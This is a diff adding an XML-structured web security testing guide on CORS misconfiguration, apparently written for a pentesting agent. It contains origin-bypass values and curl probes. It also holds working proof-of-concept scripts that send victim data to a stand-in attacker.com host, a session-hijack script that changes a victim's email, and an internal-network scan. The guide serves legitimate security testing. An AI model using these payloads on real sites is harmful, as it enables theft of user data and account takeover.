@@ -1,0 +1,331 @@
+<cors_misconfiguration_guide>
+<title>CORS MISCONFIGURATION</title>
+
+<critical>Cross-Origin Resource Sharing (CORS) misconfigurations allow attackers to bypass the same-origin policy, enabling cross-site data theft, session hijacking, and unauthorized API access. Misconfigured CORS headers can turn a simple XSS or phishing page into a full account takeover vector.</critical>
+
+<scope>
+- Origin reflection vulnerabilities
+- Null origin exploitation
+- Wildcard origins with credentials
+- Subdomain wildcards and regex bypasses
+- Pre-flight bypass techniques
+- Third-party origin trust issues
+</scope>
+
+<methodology>
+1. Identify endpoints returning CORS headers (Access-Control-Allow-Origin).
+2. Test origin reflection by submitting various Origin header values.
+3. Check if credentials are allowed with reflected or weak origins.
+4. Probe for null origin acceptance and subdomain wildcard patterns.
+5. Verify if sensitive data or actions are accessible cross-origin.
+</methodology>
+
+<cors_headers>
+<response_headers>
+{% raw %}
+# Key CORS response headers
+Access-Control-Allow-Origin: https://example.com | * | null
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: Content-Type, Authorization, X-Custom-Header
+Access-Control-Expose-Headers: X-Custom-Response-Header
+Access-Control-Max-Age: 86400
+{% endraw %}
+</response_headers>
+
+<dangerous_configurations>
+{% raw %}
+# 1. Origin reflection with credentials
+Access-Control-Allow-Origin: [reflected from Origin header]
+Access-Control-Allow-Credentials: true
+
+# 2. Null origin allowed with credentials
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+
+# 3. Wildcard with credentials (browser blocked, but backend misconfiguration)
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true  # This combination is invalid but indicates weak config
+
+# 4. Subdomain wildcard via regex
+Access-Control-Allow-Origin: https://evil.example.com  # When any subdomain is trusted
+
+# 5. Protocol downgrade
+Access-Control-Allow-Origin: http://example.com  # When https:// is expected
+{% endraw %}
+</dangerous_configurations>
+</cors_headers>
+
+<testing_techniques>
+<origin_reflection>
+{% raw %}
+# Test with attacker-controlled origin
+Origin: https://evil.com
+Origin: https://attacker.example.com
+
+# Test with target domain variations
+Origin: https://sub.target.com
+Origin: https://target.com.evil.com
+Origin: https://targetcom.evil.com
+Origin: https://target.com.attacker.com
+
+# URL-based bypass attempts
+Origin: https://target.com%60.evil.com
+Origin: https://target.com%0d%0a.evil.com
+{% endraw %}
+</origin_reflection>
+
+<null_origin>
+{% raw %}
+# Test null origin acceptance
+Origin: null
+
+# Null origin sources:
+# - Sandboxed iframes: <iframe sandbox="allow-scripts" src="data:text/html,...">
+# - Local file:// pages
+# - Cross-origin redirects
+# - data: URLs
+# - blob: URLs (sometimes)
+
+# Exploit via sandboxed iframe
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
+        src="data:text/html,<script>
+          fetch('https://target.com/api/user', {credentials: 'include'})
+          .then(r => r.json())
+          .then(d => fetch('https://attacker.com/log?data='+btoa(JSON.stringify(d))))
+        </script>">
+</iframe>
+{% endraw %}
+</null_origin>
+
+<subdomain_bypass>
+{% raw %}
+# If target trusts *.target.com subdomains
+# 1. Find XSS on any subdomain
+# 2. Use that subdomain as origin
+
+# Or if regex is weak:
+Origin: https://evil-target.com           # Missing anchor
+Origin: https://target.com.evil.com       # Suffix match
+Origin: https://nottarget.com             # Substring match
+Origin: https://target.com@evil.com       # URL parsing confusion
+{% endraw %}
+</subdomain_bypass>
+
+<pre_flight_bypass>
+{% raw %}
+# Simple requests don't trigger pre-flight:
+# - GET, HEAD, POST only
+# - Only these headers: Accept, Accept-Language, Content-Language, Content-Type
+# - Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain
+
+# Bypass techniques:
+# 1. Use POST with text/plain to avoid pre-flight
+Content-Type: text/plain
+{"action": "delete_account"}
+
+# 2. Encode JSON as form data if backend parses both
+Content-Type: application/x-www-form-urlencoded
+json={"action":"delete"}
+
+# 3. Use GET for state-changing operations (if backend allows)
+{% endraw %}
+</pre_flight_bypass>
+
+<credential_tests>
+{% raw %}
+# Test with credentials
+fetch('https://target.com/api/sensitive', {
+  credentials: 'include',
+  mode: 'cors'
+}).then(r => r.json()).then(console.log)
+
+# Check for:
+# 1. Access-Control-Allow-Credentials: true
+# 2. Specific origin (not wildcard) in Access-Control-Allow-Origin
+# 3. Session cookies or auth headers sent cross-origin
+{% endraw %}
+</credential_tests>
+</testing_techniques>
+
+<exploitation_scenarios>
+<data_theft>
+{% raw %}
+<!-- Steal user data from vulnerable API -->
+<script>
+  fetch('https://vulnerable.com/api/user/profile', {
+    credentials: 'include'
+  })
+  .then(response => response.json())
+  .then(data => {
+    // Exfiltrate sensitive data
+    new Image().src = 'https://attacker.com/log?data=' + 
+                      encodeURIComponent(JSON.stringify(data));
+  });
+</script>
+{% endraw %}
+</data_theft>
+
+<session_hijacking>
+{% raw %}
+<!-- Extract session tokens or CSRF tokens -->
+<script>
+  fetch('https://vulnerable.com/api/csrf-token', {
+    credentials: 'include'
+  })
+  .then(r => r.json())
+  .then(data => {
+    // Use CSRF token to perform actions
+    fetch('https://vulnerable.com/api/change-email', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-CSRF-Token': data.token
+      },
+      body: JSON.stringify({email: 'attacker@evil.com'})
+    });
+  });
+</script>
+{% endraw %}
+</session_hijacking>
+
+<internal_network_scan>
+{% raw %}
+<!-- Use CORS to probe internal network -->
+<script>
+  const internalHosts = [
+    'http://192.168.1.1',
+    'http://10.0.0.1',
+    'http://localhost:8080',
+    'http://internal-api.local'
+  ];
+  
+  internalHosts.forEach(host => {
+    fetch(host + '/api/status', {mode: 'cors'})
+      .then(r => r.text())
+      .then(data => {
+        console.log(host + ' accessible: ' + data);
+      })
+      .catch(() => console.log(host + ' blocked'));
+  });
+</script>
+{% endraw %}
+</internal_network_scan>
+
+<websocket_hijacking>
+{% raw %}
+<!-- CORS doesn't protect WebSocket by default -->
+<script>
+  // WebSocket doesn't use CORS; origin checking is manual
+  const ws = new WebSocket('wss://vulnerable.com/socket');
+  ws.onmessage = (e) => {
+    fetch('https://attacker.com/log?ws=' + encodeURIComponent(e.data));
+  };
+</script>
+{% endraw %}
+</websocket_hijacking>
+</exploitation_scenarios>
+
+<bypass_techniques>
+<regex_bypass>
+{% raw %}
+# Common regex vulnerabilities in origin validation
+Origin: https://target.com.evil.com       # Missing $ anchor
+Origin: https://eviltarget.com            # Missing ^ anchor  
+Origin: https://target.com%00.evil.com    # Null byte
+Origin: https://target.com\t.evil.com     # Tab character
+Origin: https://TARGET.COM                # Case sensitivity
+Origin: https://target.com:443@evil.com   # URL authority confusion
+{% endraw %}
+</regex_bypass>
+
+<protocol_confusion>
+{% raw %}
+# Test protocol variations
+Origin: http://target.com     # HTTP when HTTPS expected
+Origin: https://target.com    # Standard
+Origin: null                  # Null origin
+Origin:                       # Empty origin (rare)
+{% endraw %}
+</protocol_confusion>
+
+<vary_header_abuse>
+{% raw %}
+# Missing Vary: Origin can lead to cache poisoning
+# 1. Attacker sends request with malicious Origin
+# 2. Response cached with Access-Control-Allow-Origin: evil.com
+# 3. Victim requests same resource, gets cached response
+# 4. Victim's browser allows cross-origin access from evil.com
+
+# Check for missing Vary header
+curl -s -D- https://target.com/api/data \
+  -H "Origin: https://evil.com" | grep -i vary
+{% endraw %}
+</vary_header_abuse>
+</bypass_techniques>
+
+<testing_automation>
+{% raw %}
+# Quick CORS test with curl
+curl -s -D- https://target.com/api/endpoint \
+  -H "Origin: https://evil.com" | grep -i "access-control"
+
+# Test null origin
+curl -s -D- https://target.com/api/endpoint \
+  -H "Origin: null" | grep -i "access-control"
+
+# Test with credentials
+curl -s -D- https://target.com/api/endpoint \
+  -H "Origin: https://evil.com" \
+  -H "Cookie: session=abc123" | grep -i "access-control"
+
+# Automated testing script concept
+for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
+  echo "Testing: $origin"
+  curl -s -D- https://target.com/api/endpoint \
+    -H "Origin: $origin" | grep -i "access-control"
+done
+{% endraw %}
+</testing_automation>
+
+<validation>
+1. Demonstrate origin reflection with attacker-controlled domain.
+2. Confirm credentials are allowed (Access-Control-Allow-Credentials: true).
+3. Show successful cross-origin data access with proof (user info, tokens).
+4. Provide working PoC HTML that extracts sensitive data.
+5. Document the exact origin that bypasses validation.
+</validation>
+
+<false_positives>
+- CORS headers returned but credentials not allowed (low impact)
+- Public APIs intentionally allowing cross-origin access
+- Access-Control-Allow-Origin: * without credentials (expected for public data)
+- Pre-flight blocking the actual attack request
+- No sensitive data accessible via the vulnerable endpoint
+</false_positives>
+
+<impact>
+- Sensitive data theft (PII, financial data, credentials)
+- Session hijacking and account takeover
+- CSRF-like attacks bypassing token validation
+- Internal network reconnaissance
+- API abuse and unauthorized actions
+- Compliance violations (GDPR, PCI-DSS)
+</impact>
+
+<pro_tips>
+1. Always test with credentials: 'include' to check credential handling.
+2. Look for origin reflection in error responses as well as success responses.
+3. Check multiple endpoints; CORS policies may vary across the application.
+4. Test both pre-flight (OPTIONS) and actual requests; behavior may differ.
+5. Use sandboxed iframes to generate null origin requests.
+6. Check for Vary: Origin header to identify cache poisoning potential.
+7. Look for CORS misconfigurations on CDN/proxy layers, not just application.
+8. Test subdomains; XSS + CORS misconfiguration = full compromise.
+9. Remember WebSocket connections don't use CORS; check for origin validation.
+10. Document the full attack chain including how the victim reaches the exploit page.
+</pro_tips>
+
+<remember>CORS is a browser-enforced mechanism that can be bypassed through misconfiguration. The same-origin policy only protects against cross-origin reads when properly configured. Always validate the Origin header against an explicit allowlist and never reflect arbitrary origins when credentials are allowed.</remember>
+</cors_misconfiguration_guide>
